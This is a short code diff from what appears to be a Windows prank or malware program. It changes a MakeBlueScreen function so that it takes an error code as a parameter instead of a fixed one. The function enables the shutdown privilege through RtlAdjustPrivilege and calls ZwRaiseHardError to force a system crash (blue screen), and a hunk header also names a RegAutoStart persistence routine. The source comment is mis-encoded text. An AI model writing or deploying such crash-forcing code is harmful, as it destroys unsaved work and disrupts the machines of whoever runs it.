@@ -77,7 +77,7 @@ void RegAutoStart()
 }
 
 //À¶ÆÁº¯Êý
-void MakeBlueScreen()
+void MakeBlueScreen(unsigned int errid)
 {
 	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
 	if (ntdll != NULL)
@@ -88,7 +88,7 @@ void MakeBlueScreen()
 		unsigned char ErrKill;
 		long unsigned int HDErr;
 		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
-		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(0xc0000233, 0, 0, 0, 6, &HDErr);
+		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(errid, 0, 0, 0, 6, &HDErr);
 	}
 
 }
